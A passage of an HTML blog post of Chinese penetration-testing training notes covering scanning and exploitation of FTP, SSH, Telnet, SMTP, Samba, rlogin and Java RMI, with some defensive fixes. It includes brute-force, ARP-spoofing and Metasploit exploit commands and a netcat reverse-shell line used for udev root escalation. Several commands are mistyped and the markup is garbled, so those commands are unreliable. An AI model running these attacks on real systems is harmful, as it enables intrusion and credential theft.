@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>网络安全训练营 | Mkey的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="网络安全训练营">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络安全训练营">
+<meta property="og:url" content="https://monkeyh0ck.github.io/2021/12/01/networkSecurity/index.html">
+<meta property="og:site_name" content="Mkey的博客">
+<meta property="og:description" content="网络安全训练营">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/12/01/networkSecurity/image-20211207104429447.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/12/01/networkSecurity/image-20211207104542078.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/12/01/networkSecurity/image-20211207150818278.png">
+<meta property="og:image" content="https://monkeyh0ck.github.io/2021/12/01/networkSecurity/image-20211215110041222.png">
+<meta property="article:published_time" content="2021-11-30T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-03-26T13:33:07.796Z">
+<meta property="article:author" content="HOU">
+<meta property="article:tag" content="web-security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://monkeyh0ck.github.io/2021/12/01/networkSecurity/image-20211207104429447.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Mkey的博客" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Mkey的博客</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://monkeyh0ck.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-networkSecurity" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/12/01/networkSecurity/" class="article-date">
+  <time class="dt-published" datetime="2021-11-30T16:00:00.000Z" itemprop="datePublished">2021-12-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      网络安全训练营
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="网络安全训练营"><a href="#网络安全训练营" class="headerlink" title="网络安全训练营"></a>网络安全训练营</h1><span id="more"></span>
+
+<h2 id="linux基础配置"><a href="#linux基础配置" class="headerlink" title="linux基础配置"></a>linux基础配置</h2><h3 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">更新软件</span><br><span class="line">apt-get update			更新软件列表</span><br><span class="line">apt-get upgrade			更新软件</span><br><span class="line">apt-get dist-upgrade	更新软件内核</span><br><span class="line"></span><br><span class="line">配置更新源</span><br><span class="line">/etc/apt/source.list</span><br><span class="line"></span><br><span class="line">自启动软件</span><br><span class="line">update-rc.d 程序 enable		设置为自启动软件，但不会立马启动</span><br><span class="line"></span><br><span class="line">临时启动软件，系统重启后失效</span><br><span class="line">service 程序 start</span><br><span class="line">service 程序 status</span><br><span class="line">service 程序 stop</span><br></pre></td></tr></table></figure>
+
+<h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">查看当前用户</span><br><span class="line">id</span><br><span class="line">whoani</span><br><span class="line"></span><br><span class="line">#:root</span><br><span class="line">$:普通用户</span><br><span class="line"></span><br><span class="line">修改权限命令介绍</span><br><span class="line">chmod  +x 文件名</span><br><span class="line"></span><br><span class="line">r4	w2	x1</span><br></pre></td></tr></table></figure>
+
+<h3 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h3><p>系统漏洞扫描与分析软件</p>
+<h2 id="win2003"><a href="#win2003" class="headerlink" title="win2003"></a>win2003</h2><p>关闭防火墙</p>
+<p><img src="/2021/12/01/networkSecurity/image-20211207104429447.png" alt="image-20211207104429447"></p>
+<h3 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h3><p>3389端口的RDP</p>
+<p><img src="/2021/12/01/networkSecurity/image-20211207104542078.png" alt="image-20211207104542078"></p>
+<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><h3 id="OSI-Open-System-Interconnect"><a href="#OSI-Open-System-Interconnect" class="headerlink" title="OSI(Open System Interconnect)"></a>OSI(Open System Interconnect)</h3><p><img src="/2021/12/01/networkSecurity/image-20211207150818278.png" alt="image-20211207150818278"></p>
+<h3 id="二层发现"><a href="#二层发现" class="headerlink" title="二层发现"></a>二层发现</h3><p>利用链路层的协议进行主机发现，一般是ARP协议</p>
+<p>优点：（局域网通信使用ARP协议，利用mac地址作为对应的识别地址）</p>
+<ul>
+<li>速度快</li>
+<li>可靠性高</li>
+</ul>
+<p>缺点：</p>
+<ul>
+<li>无法扫描经过路由器的主机</li>
+</ul>
+<p>工具</p>
+<ul>
+<li>arping<ul>
+<li>缺点无法进行多个主机同时扫描</li>
+</ul>
+</li>
+<li>netdiscover<ul>
+<li>针对特定子网进行多主机扫描</li>
+</ul>
+</li>
+</ul>
+<h3 id="三层发现"><a href="#三层发现" class="headerlink" title="三层发现"></a>三层发现</h3><p>利用网络层的协议进行主机发现，一般用ICMP协议</p>
+<p>优点：</p>
+<ul>
+<li>可以发现远程主机，经过路由的主机</li>
+<li>速度相对较快</li>
+</ul>
+<p>缺点</p>
+<ul>
+<li>经常被防火墙过滤</li>
+<li>速度相比二层发现慢</li>
+</ul>
+<p>工具</p>
+<ul>
+<li>ping</li>
+<li>fping<ul>
+<li>多个主机同时进行主机发现</li>
+<li>fping -g IP</li>
+</ul>
+</li>
+<li>hping3<ul>
+<li>发送自定义ICMP数据包</li>
+</ul>
+</li>
+</ul>
+<h3 id="四层发现"><a href="#四层发现" class="headerlink" title="四层发现"></a>四层发现</h3><p>利用传输层协议进行主机发现，一般用TCP、UDP探测</p>
+<p>优点：</p>
+<ul>
+<li>可以探测远程主机</li>
+<li>比三层发现更为可靠</li>
+</ul>
+<p>缺点：</p>
+<ul>
+<li>花费事件更长</li>
+</ul>
+<p>工具</p>
+<ul>
+<li>nmap<ul>
+<li>nmap可以进行二、三、四层探测</li>
+</ul>
+</li>
+<li>hping3<ul>
+<li>可以进行四层主机发现</li>
+<li><code>hping3 --udp -c 3 IP</code></li>
+</ul>
+</li>
+<li>python脚本<ul>
+<li>nWatch</li>
+<li>调用nmap进行探测</li>
+</ul>
+</li>
+</ul>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><h3 id="端口扫描工具"><a href="#端口扫描工具" class="headerlink" title="端口扫描工具"></a>端口扫描工具</h3><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><p><code>nmap IP</code></p>
+<h4 id="Dmitry"><a href="#Dmitry" class="headerlink" title="Dmitry"></a>Dmitry</h4><p><code>dimitry - p IP</code></p>
+<h4 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h4><p><code>nc -nvz IP地址 端口范围</code></p>
+<h3 id="端口分类"><a href="#端口分类" class="headerlink" title="端口分类"></a>端口分类</h3><p>端口范围：0-65535</p>
+<p>端口分为TCP端口和UDP端口，TCP和UDP协议独立，故各自端口号也相互独立</p>
+<ul>
+<li>周知端口（0-1023）<ul>
+<li>规定好的端口号，如80端口等</li>
+</ul>
+</li>
+<li>注册端口（1024-49151）<ul>
+<li>分配给用户进程或应用程序，进程主要是用户安装的程序</li>
+</ul>
+</li>
+<li>动态端口（49152-65535）<ul>
+<li>不固定分配某种服务，而是动态分配</li>
+</ul>
+</li>
+</ul>
+<h3 id="端口Banner获取"><a href="#端口Banner获取" class="headerlink" title="端口Banner获取"></a>端口Banner获取</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><p><code>nmap IP地址 --script banner -p 端口号</code></p>
+<p>获取指定端口号的banner信息</p>
+<h4 id="dimitry"><a href="#dimitry" class="headerlink" title="dimitry"></a>dimitry</h4><p><code>dimitry -pd IP地址</code></p>
+<p>获取目标主机常用的端口的banner信息</p>
+<h4 id="netcat-1"><a href="#netcat-1" class="headerlink" title="netcat"></a>netcat</h4><p><code>nc -nv IP地址 端口号</code></p>
+<p>单个端口的banner获取</p>
+<h3 id="端口服务版本和操作系统版本信息"><a href="#端口服务版本和操作系统版本信息" class="headerlink" title="端口服务版本和操作系统版本信息"></a>端口服务版本和操作系统版本信息</h3><h4 id="nmap-1"><a href="#nmap-1" class="headerlink" title="nmap"></a>nmap</h4><p>获取端口服务版本信息</p>
+<p><code>namp -p 端口号 -sV IP地址</code></p>
+<p>操作系统版本信息</p>
+<p><code>nmap -O IP地址</code></p>
+<p>完整扫描</p>
+<p><code>nmap -A -v IP地址</code></p>
+<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><h3 id="漏洞扫描原理"><a href="#漏洞扫描原理" class="headerlink" title="漏洞扫描原理"></a>漏洞扫描原理</h3><p>漏洞扫描器向服务器发送验证数据到具体服务（端口）进行验证，当收到返回响应后，与存在的漏洞响应一致，则表明存在漏洞</p>
+<h3 id="漏洞扫描工具"><a href="#漏洞扫描工具" class="headerlink" title="漏洞扫描工具"></a>漏洞扫描工具</h3><ul>
+<li><p>nmap</p>
+<ul>
+<li><code>namp --script buln IP地址</code></li>
+</ul>
+</li>
+<li><p>nessus</p>
+</li>
+<li><p>metasploit</p>
+</li>
+</ul>
+<h3 id="WEB应用程序漏洞扫描"><a href="#WEB应用程序漏洞扫描" class="headerlink" title="WEB应用程序漏洞扫描"></a>WEB应用程序漏洞扫描</h3><ul>
+<li>Owasp-zap</li>
+<li>AWVS</li>
+<li>Appscan</li>
+<li>Nikto</li>
+<li>Burpsuite</li>
+<li>sqlmap</li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><p>文件传输协议，使用客户&#x2F;服务器民事，属于网络传输协议的应用层，使用21号端口</p>
+<p>用户分类：</p>
+<ol>
+<li>real用户</li>
+<li>administrator</li>
+<li>匿名用户</li>
+</ol>
+<p>FTP文件传输格式</p>
+<ol>
+<li>ASCII</li>
+<li>二进制格式</li>
+</ol>
+<h4 id="匿名登录漏洞"><a href="#匿名登录漏洞" class="headerlink" title="匿名登录漏洞"></a>匿名登录漏洞</h4><p>使用anonymous用户登录FTP服务器，用nc连接ftp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc IP地址 21</span><br><span class="line">USER anonymous</span><br><span class="line">PASS 123(任意)</span><br></pre></td></tr></table></figure>
+
+<h4 id="FTP后门漏洞"><a href="#FTP后门漏洞" class="headerlink" title="FTP后门漏洞"></a>FTP后门漏洞</h4><p>vsftpd手工触发漏洞：当FTP认证时，用户名USER包含:)，那么直接触发监听6200端口的连接shell，连接后权限为root。</p>
+<h4 id="安全配置"><a href="#安全配置" class="headerlink" title="安全配置"></a>安全配置</h4><ol>
+<li>禁止匿名用户登录</li>
+<li>对特定漏洞打补丁</li>
+<li>设置防火墙，禁止连接后门端口</li>
+</ol>
+<h4 id="FTP用户名密码暴力破解"><a href="#FTP用户名密码暴力破解" class="headerlink" title="FTP用户名密码暴力破解"></a>FTP用户名密码暴力破解</h4><p>medusa暴力破解FTP登录</p>
+<p><code>medusa -h IP -u username -P password -M ftp</code></p>
+<h4 id="FTP用户名明文密码验证"><a href="#FTP用户名明文密码验证" class="headerlink" title="FTP用户名明文密码验证"></a>FTP用户名明文密码验证</h4><p>FTP协议中用于用户验证的过程中，客户端与服务器端是通过明文进行交互信息。验证FTP登录过程中明文传输用户名和密码。</p>
+<h4 id="FTP用户名明文密码嗅探"><a href="#FTP用户名明文密码嗅探" class="headerlink" title="FTP用户名明文密码嗅探"></a>FTP用户名明文密码嗅探</h4><p>利用arpspoof进行ARP嗅探</p>
+<p><code>arpspoof -i eth0 192.168.1.1 -t 192.168.1.105</code></p>
+<p>将192.168.1.105的网关欺骗为本机。</p>
+<p>使用wireshark查看</p>
+<h4 id="登录FTP之后做的事情"><a href="#登录FTP之后做的事情" class="headerlink" title="登录FTP之后做的事情"></a>登录FTP之后做的事情</h4><ul>
+<li>利用metasploit创建反弹shell上传FTP服务器，利用setookit快速生成反弹shell<ul>
+<li>setookit生成反弹shell</li>
+<li>上传payload</li>
+<li>触发payload</li>
+<li>启动metasploit，发现连接，连接到ftp服务器</li>
+</ul>
+</li>
+</ul>
+<h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><h4 id="ssh-Banner"><a href="#ssh-Banner" class="headerlink" title="ssh Banner"></a>ssh Banner</h4><ul>
+<li><p>nmap获取ssh Banner</p>
+<ul>
+<li><code>nmap -p 22  IP</code></li>
+</ul>
+</li>
+<li><p>metasploit</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使用msfconsole</span><br><span class="line">use auxiliary/scanner/ssh/ssh_version</span><br><span class="line">set rhosts IP</span><br><span class="line">run</span><br><span class="line">获得ssh banner</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>nc</p>
+<ul>
+<li><code>nc IP 22(端口)</code></li>
+</ul>
+</li>
+<li><p>配置ssh规避banner信息</p>
+<ul>
+<li>在ssh配置文件sshd_config中添加一行，<code>DebianBanner no</code>再次扫描发现没有操作系统版本信息</li>
+</ul>
+</li>
+</ul>
+<h4 id="SSH弱口令破解"><a href="#SSH弱口令破解" class="headerlink" title="SSH弱口令破解"></a>SSH弱口令破解</h4><ul>
+<li><p>medusa</p>
+<ul>
+<li><code>medusa -h IP -u 用户名 -p 密码 -M ssh</code></li>
+<li>只破解</li>
+</ul>
+</li>
+<li><p>SSH命令行工具登录</p>
+<ul>
+<li><code>ssh 用户名@IP</code></li>
+<li>根据提示输入密码</li>
+</ul>
+</li>
+<li><p>Metasploit</p>
+<ul>
+<li><pre><code>msfconsole
+use auxiliary/scanner/ssh/ssh_login
+set rhost/username/password
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 获得反弹shell</span><br><span class="line"></span><br><span class="line">- 注入meterpreter payload获得功能更强大的shell</span><br><span class="line"></span><br><span class="line">  - ```</span><br><span class="line">    sessions -u 序号</span><br><span class="line">    注入meterpreter</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="SSH安全防御"><a href="#SSH安全防御" class="headerlink" title="SSH安全防御"></a>SSH安全防御</h4><ul>
+<li><p>修改默认端口</p>
+<ul>
+<li>在sshd_config中修改<code>Port</code></li>
+</ul>
+</li>
+<li><p>SSH设置PGP登录</p>
+<ul>
+<li>使用puttygen生成密钥对</li>
+<li>使用<code>ssh-keygen</code>生成.ssh目录，新建<code>authorized_keys</code>存储密钥文件</li>
+<li>使用<code>puttygen -L 拷贝密钥文件</code>将内容拷贝到<code>authorized_keys</code></li>
+<li>在putty中的auth配置密钥文件，在data中设置用户名，则不需要输入密码，直接登录</li>
+</ul>
+</li>
+<li><p>防御暴力破解</p>
+<ul>
+<li><p>只使用SSH PGP方式验证登录</p>
+<ul>
+<li>在sshd_config中，设置<code>PasswordAuthentication no</code></li>
+</ul>
+</li>
+<li><p>Iptables设置阈值防止暴力破解</p>
+<ul>
+<li><pre><code>iptables需要root权限
+iptables -I INPUT -p tcp KKdport 22 Ki eth0 -m state --state NEW -m recent --set
+iptables -I INPUT -p tcp KKdport 22 Ki eth0 -m state --state NEW -m recent --update --second 120 --hitcount 3 -j DROP
+3分钟内连续3次登录失败，拒绝登录
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### Telnet</span><br><span class="line"></span><br><span class="line">远程登录服务的标准协议和主要方式。提供了在本地计算机上完成远程主机工作的能力。默认端口23.</span><br><span class="line"></span><br><span class="line">缺点：明文传输</span><br><span class="line"></span><br><span class="line">telnet是一个明文传输协议，存在安全隐患，所以不被重用。</span><br><span class="line"></span><br><span class="line">#### 版本获取</span><br><span class="line"></span><br><span class="line">- nmap</span><br><span class="line"></span><br><span class="line">  - `nmap -p23 IP`</span><br><span class="line"></span><br><span class="line">- msfconsole</span><br><span class="line"></span><br><span class="line">  - ```</span><br><span class="line">    use auxiliary/scanner/telnet/telnet_version</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h4><ul>
+<li><p>msfconsole</p>
+<ul>
+<li><pre><code>use auxiliary/scanner/telnet/telnet_login
+set rhosets
+set username
+set pass_file
+run
+sessions -i 序号
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 登录telnet</span><br><span class="line"></span><br><span class="line">- msf</span><br><span class="line"></span><br><span class="line">  - ```</span><br><span class="line">    use auxiliary/scanner/telnet/telnet_login</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+<li><p>exp获取root权限</p>
+<ul>
+<li><p>wget下载exp</p>
+</li>
+<li><p>nc监听对应端口</p>
+</li>
+<li><p>编译exp，执行，获取root</p>
+<ul>
+<li><pre><code>gcc 源文件 -o exploit
+echo &#39;#!/bin/sh&#39; &gt; /tmp/run
+echo &#39;/bin/netcat -e /bin/sh IP PORT&#39; &gt;&gt; /tmp/run
+ps -edf | grep udev
+执行exploit，端口为root权限的pid-1
+./exploit pid-1
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### smtp</span><br><span class="line"></span><br><span class="line">邮件发送使用smtp协议，占用25端口。</span><br><span class="line"></span><br><span class="line">邮件接收使用pop3（110端口）或imap协议（143端口）。</span><br><span class="line"></span><br><span class="line">#### 枚举smtp用户名</span><br><span class="line"></span><br><span class="line">- telnet测试用户名</span><br><span class="line"></span><br><span class="line">  - ```</span><br><span class="line">    telnet IP Port(25)</span><br><span class="line">    vrfy test@mail.test.lab</span><br><span class="line">    252(用户名存在)</span><br><span class="line">    vrfy test2@mail.test.lab</span><br><span class="line">    550(用户名不存在)</span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>metasploit</p>
+<ul>
+<li><pre><code>use auxiliary/scanner/smtp/smtp_enum
+set rhosts
+set rport 25
+set user
+exploit
+run
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- smtp-user-enum</span><br><span class="line"></span><br><span class="line">  - `smtp-user-enum -M VRFY -U filename -t IP`</span><br><span class="line"></span><br><span class="line">- ismtp</span><br><span class="line"></span><br><span class="line">  - `ismtp -h IP:Port(25) -e file`</span><br><span class="line"></span><br><span class="line">#### smtp暴力破解</span><br><span class="line"></span><br><span class="line">- smtp版本信息获取</span><br><span class="line"></span><br><span class="line">  - ```</span><br><span class="line">    use auxiliary/scanner/smtp/smtp_version</span><br><span class="line">    set rhosts</span><br><span class="line">    exploit</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+<li><p>medusa破解密码</p>
+<ul>
+<li><code>medusa -h IP -u name -P passfile -M smtp</code></li>
+</ul>
+</li>
+<li><p>smtp验证方式</p>
+<ul>
+<li><img src="/2021/12/01/networkSecurity/image-20211215110041222.png" alt="image-20211215110041222"></li>
+</ul>
+</li>
+</ul>
+<h3 id="rpcbind"><a href="#rpcbind" class="headerlink" title="rpcbind"></a>rpcbind</h3><p>rpcbind是NFS中用来进行消息通知的服务，一般运行在111端口。并且NFS配置开启rpcbind_enable&#x3D;”YES”</p>
+<h4 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h4><ul>
+<li><p>nmap</p>
+<ul>
+<li><p>探测目标rpcinfo信息</p>
+</li>
+<li><p><code>nmap -p 111 --script=rpcinfo IP</code></p>
+</li>
+</ul>
+</li>
+<li><p>metasploit</p>
+<ul>
+<li><code>auxiliary/scanner/misc/sunrpc_portmapper</code></li>
+</ul>
+</li>
+</ul>
+<h4 id="samba远程执行漏洞利用"><a href="#samba远程执行漏洞利用" class="headerlink" title="samba远程执行漏洞利用"></a>samba远程执行漏洞利用</h4><ul>
+<li><p>samba</p>
+<ul>
+<li>samba是实现<strong>SMB</strong>协议的免费软件，由服务器及客户端程序构成。SMB是一种在局域网上共享文件和打印机的一种通信协议，他为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。</li>
+<li><strong>一般运行端口：139、445</strong></li>
+</ul>
+</li>
+<li><p>使用nmap探测</p>
+<ul>
+<li>探测目标的rkz服务版本信息</li>
+<li><code>nmap -sV -p 139 445 IP</code></li>
+</ul>
+</li>
+<li><p>metasploit漏洞利用</p>
+<ul>
+<li><pre><code>use exploit/multi/samba/usermap_script
+set payload
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 防御修复</span><br><span class="line"></span><br><span class="line">  - 升级samba</span><br><span class="line"></span><br><span class="line">### rlogin</span><br><span class="line"></span><br><span class="line">rlogin（远程登录）是unix命令。一旦进入主机，用户可以操纵主机允许的任何事情</span><br><span class="line"></span><br><span class="line">513是登录端口</span><br><span class="line"></span><br><span class="line">512是验证端口</span><br><span class="line"></span><br><span class="line">##### 探测目标rlogin</span><br><span class="line"></span><br><span class="line">- `nmap -sV -p 512,513 IP`</span><br><span class="line">- 512用于对远程执行的进程进行验证</span><br><span class="line">- 513反弹bash shell</span><br><span class="line"></span><br><span class="line">##### rlogin最高权限登录</span><br><span class="line"></span><br><span class="line">`rlogin -l root IP`</span><br><span class="line"></span><br><span class="line">##### 防御修复</span><br><span class="line"></span><br><span class="line">1. 添加root登录验证密码</span><br><span class="line">2. 关闭rlogin，使用ssh</span><br><span class="line"></span><br><span class="line">### 反序列远程命令执行漏洞</span><br><span class="line"></span><br><span class="line">#### java rmi</span><br><span class="line"></span><br><span class="line">rmi是远程方法调用。是一种机制，能够让一个java虚拟机上的对象调用另一个java虚拟机中的对象。</span><br><span class="line"></span><br><span class="line">对于任何一个以对象为参数的rmi接口，都可以通过发一个自己构造的对象，迫使服务器将这个对象按任何一个存在于class path中的可序列化类来反序列化。</span><br><span class="line"></span><br><span class="line">RMI的传输100%基于反序列化</span><br><span class="line"></span><br><span class="line">#### 探测目标rmi</span><br><span class="line"></span><br><span class="line">`nmap -p 1099 -sV IP`</span><br><span class="line"></span><br><span class="line">探测目标的版本信息</span><br><span class="line"></span><br><span class="line">#### rmi远程命令执行利用</span><br><span class="line"></span><br><span class="line">使用metasploit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<p>use exploit&#x2F;multi&#x2F;misc&#x2F;java_rmi_server</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 防御修复</span><br><span class="line"></span><br><span class="line">1. 存在反序列化传输</span><br><span class="line">2. 存在有缺陷的第三方库如：commons-collections 及时升级库</span><br><span class="line"></span><br><span class="line">### 漏洞利用后门连接</span><br><span class="line"></span><br><span class="line">#### 后门连接测试</span><br><span class="line"></span><br><span class="line">测试端口</span><br><span class="line"></span><br><span class="line">`nmap -sV -p prot IP`(1524)</span><br><span class="line"></span><br><span class="line">连接后门</span><br><span class="line"></span><br><span class="line">`nc IP prot`</span><br><span class="line"></span><br><span class="line">### nfs</span><br><span class="line"></span><br><span class="line">nfs(网络文件系统)，是freeBSD支持的文件系统中的一种，它允许网络中的计算机通过TCP/IP网络共享资源。在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件。</span><br><span class="line"></span><br><span class="line">一般默认端口为2049</span><br><span class="line"></span><br><span class="line">#### 探测目标nfs</span><br><span class="line"></span><br><span class="line">`nmap --script=nfs-* IP`</span><br><span class="line"></span><br><span class="line">#### 探测nfs是否可以导出</span><br><span 